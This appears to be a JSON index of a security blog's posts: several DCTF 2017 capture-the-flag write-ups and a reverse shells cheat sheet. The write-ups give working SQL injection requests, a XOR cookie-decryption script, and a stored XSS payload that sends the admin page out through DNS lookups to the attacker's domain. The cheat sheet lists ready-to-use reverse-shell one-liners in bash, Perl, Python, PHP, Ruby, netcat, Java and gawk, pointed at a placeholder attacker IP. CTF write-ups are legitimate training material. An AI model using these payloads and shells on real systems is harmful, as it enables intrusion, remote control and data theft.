(900,600)]transformblit(tri1, tri2, blank, part1)tri2 = [(100,140), (470,140), (800,10)]transformblit(tri1, tri2, blank, part1)tri2 = [(344,218), (365,0), (800,670)]transformblit(tri1, tri2, blank, part1)# final trimpart1 = part1.crop((213, 141, 469, 419))contrast = ImageEnhance.Contrast(part1)part1 = contrast.enhance(1.5)Result:Example of “laptop” QR code retrieval:part2 = qr.crop((2031, 1584, 2287, 1742))contrast = ImageEnhance.Contrast(part2)part2 = contrast.enhance(2.7)part2 = ImageOps.mirror(part2)part2 = part2.rotate(0+20-4, resample=Image.BICUBIC, expand=True)width, height = part2.sizem = -0.49xshift = abs(m) * widthnew_width = width + int(round(xshift))part2 = part2.transform((new_width, height), Image.AFFINE, (1.1, m, -xshift if m &gt; 0 else 0, 0, 1.605, 0), Image.BILINEAR)part2 = part2.resize((800, 700), Image.ANTIALIAS)contrast = ImageEnhance.Contrast(part2)part2 = contrast.enhance(1.2)part2 = part2.crop((245, 80, 393, 301))tri1 = [(10,10), (20,20), (10,20)]tri2 = [(0,0), (0,220), (100,220)]transformblit(tri1, tri2, blank, part2)part2 = part2.resize((240, 278), Image.ANTIALIAS)Result:Final QR:Execution of the python script:lucian@nitescu:~/security-cctv$ python sol.py BMQQGBMIBKCIAIJLBOKNIKAACQPPKAJGNCKNBNBHOIJQQPHAHCLPJQHIBJIIQCNKIJJBBNKLJGAQJLHKHIALMBMCNlucian@nitescu:~/security-cctv$ After entering the token in less than a minute we get the flag.DCTF{44c5e6a2ef50636b1d5ad1023bb2c63a5ed62d40549d9edb537c54b4cb72b37e}" }, { "title": "[DCTF 2017] State Agency Writeup", "url": "/nitesculucian.github.io/2018/07/15/dctf-2017-state-agency-writeup/", "categories": "dctf, writeups", "tags": "DCTF, DefCamp, 2017, writeups, CTF, challange", "date": "2018-07-15 17:37:00 +0300", "snippet": "Description:This state agency has some secrets. Exfiltrate those.http://state-agency.tux.ro/Author:Lucian NitescuStats:382 point / 5 solversSolution:The challenge started with this simple website:E...", "content": "Description:This state agency has some secrets. Exfiltrate those.http://state-agency.tux.ro/Author:Lucian NitescuStats:382 point / 5 solversSolution:The challenge started with this simple website:Example of an “article”:By removing the parameters (example: “?Keyium=5889&amp;Name=20+hacker+cats!&amp;Owner=SA&amp;Permission=cHVibGljcHVibGljcHVibGljcHVibGljcHVibGljcHVibGlj”) we get the same response as before. The only input is the subdomain name. By setting it to 5888 we get:The answer is a hint to an SQL injection challenge and also when we arrive on 5885 we get:If we will perform an basic SQL injection in the subdomain name we will get:GET / HTTP/1.1Host: 5885 ') or 1 ;-- .state-agency.tux.roUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Connection: closeUpgrade-Insecure-Requests: 1The only way to bypass the “WAF” is to avoid certain requests. Also if you obtain in your response “DCTF”, “{“ or “}” your request will be blocked and you will receive “the Private data exfiltration attempt blocked” response. One way of extracting the flag is to extract characters as such:HTTP Request:GET / HTTP/1.1Host: 5880') union select 1, 1, 1, 1, SUBSTRING(Content, 1, 1) from articles ;-- .state-agency.tux.roUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Connection: closeUpgrade-Insecure-Requests: 1Flag Response: DHTTP Request:GET / HTTP/1.1Host: 5880') union select 1, 1, 1, 1, SUBSTRING(Content, 1, 1) from articles ;-- .state-agency.tux.roUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Connection: closeUpgrade-Insecure-Requests: 1Flag Response: DCTUntil you will get that the flag is: DCTF{8bd68b9d0b517ae71d32c62d7d00cbf27822d5014d1a8483684e19fbea99c44f}" }, { "title": "[DCTF 2017] hack-tac-toe Writeup", "url": "/nitesculucian.github.io/2018/07/15/dctf-2017-hack-tac-toe-writeup/", "categories": "dctf, writeups", "tags": "DCTF, DefCamp, 2017, writeups, CTF, challange", "date": "2018-07-15 17:37:00 +0300", "snippet": "Description:Pair up! Let’s play a game of tic tac toe :)https://hacktactoe.dctf-f1nals-2017.def.camp/Author:Anatol, Lucian NitescuStats:360 point / 10 solversSolution:The challenge started with thi...", "content": "Description:Pair up! Let’s play a game of tic tac toe :)https://hacktactoe.dctf-f1nals-2017.def.camp/Author:Anatol, Lucian NitescuStats:360 point / 10 solversSolution:The challenge started with this simple website:If we change the name of Player 1 with test we get:Encrypted_Game_Session=ITSSn%2FICisO1i6CBSOBGkzM0kJWzU%2FS02%2B%2B92B6zVJt3N5aRvRTSxbbP9tlP4VKdcziQlroU0pa7nqPZS%2BMCyXBol8PoENSSt5rwjx7lB5gkOZfD6EDRlb%2BZ8JALvBeSdDSFy%2Bgc1dW02vzVE6U0xCF3wtepQJLM%2FJPz1wvpBcUlPIWe%2BkuIza35qoxQ4haIciyc1rNEitX8yqmfTKVfwXo%2BnNazR4rV%2FMqpn0y1RpMpNJee9A%3D%3DIf we change the name of Player 2 with test2 we get:Encrypted_Game_Session=ITSSn%2FICisO1i6CBSOBGkzM0kJWzU%2FS02%2B%2B92B6zVJt3N5aRvRTSxbbP9tlP4VKdcziQlroU0pa7nqPZS%2BMCyXBol8PoENSSt5rwjx7lB5gkOZfD6EDRlb%2BZ8JALvBeSdDSFy%2Bgc1dW02vzeG71GqEAOp6WJcbD3j6nG7SmHZKhADqeliXGw94%2Bpxu0ph2SKe32dkLNT3pbizPTPEvRenHosw9boFZLM%2FJPz1wv0B8cya4We4EuCzPyT8NcL9AfHMmuVh7IYise01A%3D%3DUnder the Encrypted_Game_Session we observe some static stored things (because of the small variation).If we request https://hacktactoe.dctf-f1nals-2017.def.camp/action.php?name=%00%00%00%00%00%00%00%00%00%00%00%00%00%00 we will get that:Encrypted_Game_Session=ITSSn%2FICisO1i6CBSOBGkzM0kJWzU%2FS02%2B%2B92B6zVJt3N5aRvRTSxbbP9tlP4VKdcziQlroU0pa7nqPZS%2BMCyXBol8PoENSSt5rwjx7lB5gkOZfD6EDRlb%2BZ8JALvBeSdDSFy%2Bgc1dW02vzeG71GqEAOp6WJcbD3j6nG7SmHZKhADqeliXGw94%2Bpxu0ph2SKe32dkLNT3pbizPTPEvRenHosw9boFZLM%2FJPz1wv0B8cya4We4EuCzPyT8NcL9AfHMmuVh7IYise01A%3D%3DWe now use an URL decoder:urldecoded(Encrypted_Game_Session):ITSSn/ICisO1i6CBSOBGkzM0kJWzU/S02++92B6zVJt3N5aRvRTSxbbP9tlP4VKdcziQlroU0pa7nqPZS+MCyXBol8PoENSSt5rwjx7lB5gkOZfD6EDRlb+Z8JALvBeSdDSFy+gc1dW02vzeG71GqEAOp6WJcbD3j6nG7SmHZKhADqeliXGw94+pxu0ph2SKe32dkLNT3pbizPTPEvRenHosw9boFZLM/JPz1wv0B8cya4We4EuCzPyT8NcL9AfHMmuVh7IYise01A==We now use an base 64 decoder to hex:decode_base64_to_hex(urldecoded(Encrypted_Game_Session):21 34 92 9f f2 02 8a c3 b5 8b a0 81 48 e0 46 93 33 34 90 95 b3 53 f4 b4 db ef bd d8 1e b3 54 9b 77 37 96 91 bd 14 d2 c5 b6 cf f6 d9 4f e1 52 9d 73 38 90 96 ba 14 d2 96 bb 9e a3 d9 4b e3 02 c9 70 68 97 c3 e8 10 d4 92 b7 9a f0 8f 1e e5 07 98 24 39 97 c3 e8 40 d1 95 bf 99 f0 90 0b bc 17 92 74 34 85 cb e8 1c d5 d5 b4 da fc de 1b bd 46 a8 40 0e a7 a5 89 71 b0 f7 8f a9 c6 ed 29 87 64 a8 40 0e a7 a5 89 71 b0 f7 8f a9 c6 ed 29 87 64 8a 7b 7d 9d 90 b3 53 de 96 e2 cc f4 cf 12 f4 5e 9c 7a 2c c3 d6 e8 15 92 cc fc 93 f3 d7 0b f4 07 c7 32 6b 85 9e e0 4b 82 cc fc 93 f0 d7 0b f4 07 c7 32 6b 95 87 b2 18 8a c7 b4 d4From this and after a few retries we can retrive that “40 0e a7 a5 89 71 b0 f7 8f a9 c6 ed 29 87 64 a8” is static and also is the key for our XOR “encryption”. After running the following python script we get:import sysdef xor_strings(xs, ys):\treturn \"\".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))buf = \"2134929ff2028ac3b58ba08148e0469333349095b353f4b4dbefbdd81eb3549b77379691bd14d2c5b6cff6d94fe1529d73389096ba14d296bb9ea3d94be302c9706897c3e810d492b79af08f1ee50798243997c3e840d195bf99f0900bbc1792743485cbe81cd5d5b4dafcde1bbd46a8400ea7a58971b0f78fa9c6ed298764a8400ea7a58971b0f78fa9c6ed2987648a7b7d9d90b353de96e2ccf4cf12f45e9c7a2cc3d6e81592ccfc93f3d70bf407c7326b859ee04b82ccfc93f0d70bf407c7326b9587b2188ac7b4d4\"key = \"400ea7a58971b0f78fa9c6ed298764a8\"binary_a = buf.decode(\"hex\")binary_b = key.decode(\"hex\")xored = xor_strings(binary_a, binary_b).encode(\"hex\")print xoredResult: 613a353a7b733a343a22666c6167223blucian@nitescu:~$ pythonPython 2.7.12 (default, Nov 19 2016, 06:48:10) [GCC 5.4.0 20160609] on linux2Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; buf = \"613a353a7b733a343a22666c6167223b\"&gt;&gt;&gt; buf.decode(\"hex\")'a:5:{s:4:\"flag\";'&gt;&gt;&gt; At this point we are sure about our XOR key and we have to just improve a bit our python script. Like this:import sysdef xor_strings(xs, ys):\treturn \"\".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))buf = \"2134929ff2028ac3b58ba08148e0469333349095b353f4b4dbefbdd81eb3549b77379691bd14d2c5b6cff6d94fe1529d73389096ba14d296bb9ea3d94be302c9706897c3e810d492b79af08f1ee50798243997c3e840d195bf99f0900bbc1792743485cbe81cd5d5b4dafcd513a534c42177c2d7a94092ccfc93f3d70be905c5253c859efa4b88cdadf9aa8c50e21688722c9cd6b3448ad5fccaa99f4ca55fc17a3e9cd6b3478ad5fccaa99f4cb546932934979ef4\"key = \"400ea7a58971b0f78fa9c6ed298764a8\"while len(buf) &gt; 32:\tbinary_a = buf.decode(\"hex\")\tbinary_b = key.decode(\"hex\")\txored = xor_strings(binary_a, binary_b).encode(\"hex\")\txored = xored.decode(\"hex\")\tprint xored\tbuf = buf[len(key):]At execution we get the flag:lucian@nitescu:~$ python 1.py a:5:{s:4:\"flag\";s:70:\"DCTF{5740379144eb29f04ff6536733eba47e4bdfa0f0faade836b7bc0d70fa1ab006}\";s:4:\"name\";s:8:\"Player 1\";s:5:\"name2\";s:8:\"Player 2\";s:5:\"score\";i:0;s:6:\"score2\";DCTF{5740379144eb29f04ff6536733eba47e4bdfa0f0faade836b7bc0d70fa1ab006}" }, { "title": "[DCTF 2017] Fedora Shop Writeup", "url": "/nitesculucian.github.io/2018/07/15/dctf-2017-fedora-shop-writeup/", "categories": "dctf, writeups", "tags": "DCTF, DefCamp, 2017, writeups, CTF, challange", "date": "2018-07-15 17:29:00 +0300", "snippet": "Description:After a series of attacks against their administrators they firewalled their facility. Will this stop you?https://fedora-shop.dctf-f1nals-2017.def.camp/Author:Lucian Nitescu, AnatolStat...", "content": "Description:After a series of attacks against their administrators they firewalled their facility. Will this stop you?https://fedora-shop.dctf-f1nals-2017.def.camp/Author:Lucian Nitescu, AnatolStats:374 point / 7 solversSolution:The challenge started with this simple website:When we send the order (on “Complete Order”) we can exploit an stored XSS vulnerability in the “Telephone” input field. Example:After “Complete Order”:Proof of stored XSS:On this page we can observe two important things. First we can see that our XSS vulnerability exploit was successful and that your order was visited by an admin and the status has been changed to “Shipped!” from “Pending approval”. But where is our flag?The flag is on “/admin.php” and can be accessed only by the admin. Example:Also any http request or ways of data exfil using stored XSS that require http request have been firewalled (as stated in the description of the challenge). One way of getting the flag from “admin.php” page is to use DNS requests on port 53. Example:On our exfil server we will listen for DNS requests using the following command:tcpdump -vn udp port 53 -i ens3As attack vector for only first 25 characters (50 hexa) of the flag we will use: Note that the “Telephone” input has to be stored is the DB and should never exceed 255 characters.&lt;script&gt;setTimeout(function(){$.get('/admin.php',function(d){var h='';for(i=0;i&lt;d.length;i++){h+=(\"00\"+d.charCodeAt(i).toString(16)).slice(-2);}$(document.body).append($('&lt;img&gt;').attr('src','//t'+h.substring(0,50)+'.dns.tux.ro'));});},999);&lt;/script&gt;The above script will be executed when the Admin will visit the orders page and it will also send the DNS request to our server, which will look like:Which stands for:lucian@nitescu:~$ pythonPython 2.7.12 (default, Nov 19 2016, 06:48:10) [GCC 5.4.0 20160609] on linux2Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; buf = \"444354467b3934366436636131366332663337306237343563\"&gt;&gt;&gt; buf.decode(\"hex\")'DCTF{946d6ca16c2f370b745c'&gt;&gt;&gt; Now we can just change the script to get the next 25 characters of the flag until we get this:DCTF{946d6ca16c2f370b745caf00f45ff2ac3656a3dcfee5d35cd8e853dc6d13470d}" }, { "title": "Reverse Shells Cheat Sheet", "url": "/nitesculucian.github.io/2018/07/15/reverse-shells-cheat-sheet/", "categories": "cheatsheet, offensive_security", "tags": "offensive security, cheat sheet, reverse shell, backdoor, bash, perl, python, PHP", "date": "2018-07-15 00:00:00 +0300", "snippet": "This list represent an comprehensive cheat sheet of shells and other related stuff.ListeningTo setup a listening netcat instance, enter the following:sudo nc -nvlp 80Reverse ShellsTo connect back t...", "content": "This list represent an comprehensive cheat sheet of shells and other related stuff.ListeningTo setup a listening netcat instance, enter the following:sudo nc -nvlp 80Reverse ShellsTo connect back to a listening netcat instance, enter the following:Bashbash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1PERLperl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'PERL Windows 1perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"ATTACKING-IP:80\");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'Pythonpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'PHPphp -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'Rubyruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'Netcatnc -e /bin/sh 10.0.0.1 1234Javar = Runtime.getRuntime()p = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[])p.waitFor()Gawk Reverse Shell#!/usr/bin/gawk -fBEGIN { Port = 8080 Prompt = \"bkd&gt; \" Service = \"/inet/tcp/\" Port \"/0/0\" while (1) { do { printf Prompt |&amp; Service Service |&amp; getline cmd if (cmd) { while ((cmd |&amp; getline) &gt; 0) print $0 |&amp; Service close(cmd) } } while (cmd != \"exit\") close(Service) }}Spawning interactive reverse shells with TTY# In reverse shell $ python -c 'import pty; pty.spawn(\"/bin/bash\")'Ctrl-Z# In Attacker console$ stty raw -echo$ fg# In reverse shell$ reset$ export SHELL=bash$ export TERM=xterm-256color$ stty rows &lt;num&gt; columns &lt;cols&gt;Sources https://highon.coffee/blog/reverse-shell-cheat-sheet/ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet https://medium.com/@6c2e6e2e/spawning-interactive-reverse-shells-with-tty-a7e50c44940e" }, { "title": "New beginnings!", "url": "/nitesculucian.github.io/2018/07/12/welcome-to-jekyll/", "categories": "jekyll, update", "tags": "jekyll, Lucian Nitescu", "date": "2018-07-12 23:16:45 +0300", "snippet": "Jekyll is my new black.", "content": "Jekyll is my new black." } ]
